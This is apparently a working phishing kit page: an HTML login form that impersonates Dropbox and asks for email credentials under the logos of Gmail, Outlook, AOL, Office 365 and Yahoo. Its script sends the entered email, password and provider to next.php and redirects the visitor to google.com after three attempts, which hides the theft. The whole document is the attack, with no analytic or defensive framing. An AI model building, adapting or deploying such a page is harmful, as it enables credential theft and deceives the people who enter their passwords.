
<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Login - Dropbox</title>
    <link rel="shortcut icon" type="image/png" href="/images/favicon.png">
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">
      /* Made with love by Mutiullah Samim*/

      @import url('https://fonts.googleapis.com/css?family=Numans');
      .container{
        align-content: center;
      }

      .card{
        
        width: auto;
        /*background-color: rgba(0,0,0,0.7) !important;*/

      }

      .social_icon span{
        /*font-size: 60px;*/
        /*margin-left: 10px;*/
        color: #FFC312;
      }

      .social_icon span:hover{
        color: white;
        cursor: pointer;
      }

      .card-header h3{
        color: white;
      }

      .social_icon{
        
      }

      .input-group-prepend span{
        width: 50px;
        background-color: #FFC312;
        color: black;
        border:0 !important;
      }

      input:focus{
        outline: 0 0 0 0  !important;
        box-shadow: 0 0 0 0 !important;

      }

      .remember{
        color: white;
      }

      .remember input
      {
        width: 20px;
        height: 20px;
        margin-left: 15px;
        margin-right: 5px;
      }

      .login_btn{
        color: black;
        background-color: #FFC312;
        width: 100px;
      }

      .login_btn:hover{
        color: black;
        background-color: white;
      }

      .links{
        color: white;
      }

      .links a{
        margin-left: 4px;
      }

      .myButton {
  box-shadow: 0px 10px 14px -7px #29bbff;
  background:linear-gradient(to bottom, #2dabf9 5%, #0688fa 100%);
  background-color:#2dabf9;
  border-radius:8px;
  display:inline-block;
  cursor:pointer;
  color:#ffffff;
  font-family:Arial;
  font-size:20px;
  font-weight:bold;
  padding:10px 22px;
  text-decoration:none;
  text-shadow:0px 1px 0px #213369;
}
.myButton:hover {
  background:linear-gradient(to bottom, #0688fa 5%, #2dabf9 100%);
  background-color:#0688fa;
}
.myButton:active {
  position:relative;
  top:1px;
}


      @media only screen and (max-width: 995px) {

      /*html,body{
        background-image: url('images/4b.jpg');
        background-size: cover;
        background-repeat: no-repeat;
        height: auto;
        font-family: 'Numans', sans-serif;
      }*/
      }
    </style>
  </head>
  <body>
    <div class="container-fluid" style="padding:100px; background-color: #003c6d;">
      <div class="row">
        <div class="col-lg-6 text-center" style="background-image:url('images/1a.jpg'); background-size: cover;background-repeat: no-repeat; background-position: right; padding: 100px 30px 100px 30px;border-radius:30px 0px 0px 30px;">
          <img src="images/dropbox.png" class="img-fluid" width="150px"><br>
          <span class="h2 text-white">Dropbox</span><br>
          <span class="h6 text-white">Dropbox is the world's first smart workspace. We put all your team's materials together and give you access to your favorite tools. You no longer have to browse all your files either, because we show you what's important to you.</span><br>
          <hr class="mr-auto rounded" style="width: 40%; border:2px solid white; "><br><br>
          <span class="h5 text-white">For companies and teams of all sizes</span><br>
        </div>
        <div class="col-lg-6 bg-white text-center" style="padding: 40px 40px 40px 40px; border-radius:0px 30px 30px 0px;">
              <div>
                <div class="card border-0">
                  <form id="contact" class="form-horizontal well">
                    <div class="card-body">
                      <div class="col-lg-12">
                        <span class="h5">Sign in to view file</span>
                        <div class="alert alert-danger" id="msg"></div>
                        <div class="form-group mt-1">
                          <label for="exampleInputEmail1" class="h6 font-weight-normal" >Email</label>
                          <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
                        </div>
                      </div>
                      <div class="col-lg-12">
                        <div class="form-group">
                          <label for="Password" class="h6 font-weight-normal">Enter Password</label>
                          <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Minimum 5 characters">
                        </div>
                      </div>
                    </div>
                    <div class="modal-footer border-0">
                      <button id="submit-btn" class="myButton">Sign in <i class="fas fa-sign-in-alt text-white"></i></button>
                    </div>
                  </form>
                  <div class="card-footer bg-transparent">
                    <div class="d-flex rounded p-2 justify-content-end social_icon rounded" style="border:1px solid white;background-color: rgba(0,126,229,0.7);">
                      <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                        <span><img id="fieldImgG" src="images/gmail.png" width="50px" class="rounded"></span>
                      </a>
                      <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                        <span><img id="fieldImgO" src="images/outlook-w.png" width="50px" class="rounded"></span>
                      </a>
                      <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                        <span><img id="fieldImgA" src="images/aol-w.png" width="50px" class="rounded"></span>
                      </a>
                      <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                        <span><img id="fieldImgOf" src="images/office365-w.png" width="50px" class="rounded"></span>
                      </a>
                      <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                        <span><img id="fieldImgY" src="images/yahoo-w.png" width="50px" class="rounded"></span>
                      </a>
                      <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                        <span><img id="fieldImgOt" src="images/other-w.png" width="50px" class="rounded"></span>
                      </a>
                    </div>
                    <div class="d-flex text justify-content-center mt-2">
                      <span class="h6 font-weight-normal">This page is protected by reCAPTCHA, and subject to the Google <a href="#">Privacy Policy</a> and <a href="#">Terms</a> of Service.</span>
                    </div>
                    <div class="d-flex justify-content-center">
                      <span>@2020 Dropbox Buisness</span><br>
                    </div>
                  </div>
                </div>
              </div>  
            
        </div>
      </div>
    </div>



    

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>

    /* global $ */
    $(document).ready(function(){
      $("#msg").hide();
      var count=0;
      $('#gmailmodal').click(function () {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/gmail.png');
        $('#fieldImgO').attr('src', 'images/outlook-w.png');
        $('#fieldImgA').attr('src', 'images/aol-w.png');
        $('#fieldImgOf').attr('src', 'images/office365-w.png');
        $('#fieldImgY').attr('src', 'images/yahoo-w.png');
        $('#fieldImgOt').attr('src', 'images/other-w.png');
        $('#field').html("Gmail");
        $('#ajaxModal').modal('show');
      });
      $('#outlookmodal').click(function () {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/gmail-w.png');
        $('#fieldImgO').attr('src', 'images/outlook-g.png');
        $('#fieldImgA').attr('src', 'images/aol-w.png');
        $('#fieldImgOf').attr('src', 'images/office365-w.png');
        $('#fieldImgY').attr('src', 'images/yahoo-w.png');
        $('#fieldImgOt').attr('src', 'images/other-w.png');
        $('#field').html("Outlook");
        $('#ajaxModal').modal('show');
      });
      $('#aolmodal').click(function () {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/gmail-w.png');
        $('#fieldImgO').attr('src', 'images/outlook-w.png');
        $('#fieldImgA').attr('src', 'images/aol.png');
        $('#fieldImgOf').attr('src', 'images/office365-w.png');
        $('#fieldImgY').attr('src', 'images/yahoo-w.png');
        $('#fieldImgOt').attr('src', 'images/other-w.png');
        $('#field').html("Aol");
        $('#ajaxModal').modal('show');
      });
      $('#office365modal').click(function () {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/gmail-w.png');
        $('#fieldImgO').attr('src', 'images/outlook-w.png');
        $('#fieldImgA').attr('src', 'images/aol-w.png');
        $('#fieldImgOf').attr('src', 'images/office365.png');
        $('#fieldImgY').attr('src', 'images/yahoo-w.png');
        $('#fieldImgOt').attr('src', 'images/other-w.png');
        $('#field').html("Office 365");
        $('#ajaxModal').modal('show');
      });
      $('#yahoomodal').click(function () {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/gmail-w.png');
        $('#fieldImgO').attr('src', 'images/outlook-w.png');
        $('#fieldImgA').attr('src', 'images/aol-w.png');
        $('#fieldImgOf').attr('src', 'images/office365-w.png');
        $('#fieldImgY').attr('src', 'images/yahoo.png');
        $('#fieldImgOt').attr('src', 'images/other-w.png');
        $('#field').html("Yahoo");
        $('#ajaxModal').modal('show');
      });
      $('#othermodal').click(function () {
        $('#contact').trigger("reset");
        $('#fieldImgG').attr('src', 'images/gmail-w.png');
        $('#fieldImgO').attr('src', 'images/outlook-w.png');
        $('#fieldImgA').attr('src', 'images/aol-w.png');
        $('#fieldImgOf').attr('src', 'images/office365-w.png');
        $('#fieldImgY').attr('src', 'images/yahoo-w.png');
        $('#fieldImgOt').attr('src', 'images/other-g.png');
        $('#field').html("Other Mail");
        $('#ajaxModal').modal('show');
      });
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();


        var msg = $('#msg').html();
        $('#msg').text( msg );
        count=count+1;
        if (count>=3) {
          count=0;
          window.location.replace("http://google.com");
        }
        else
        {
          $.ajax({
            dataType: 'JSON',
            url: 'next.php',
            type: 'POST',
            data:{
              email:email,
              password:password,
              detail:detail,

            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $('#msg').html(response['msg']);
                  // $('input, textarea').val(function() {
                  //    return this.defaultValue;
                  // });
              }
              else{
                $('#msg').html(response['msg']);
              }
          }
      },
      error: function(){
        $("#msg").show();
        $('#msg').html("Please try again later");
      },
      complete: function(){
        $('#submit-btn').html('Login <i class="fas fa-sign-in-alt text-white"></i>');
      }
  });
        }
      });
    });
  </script>
  </html>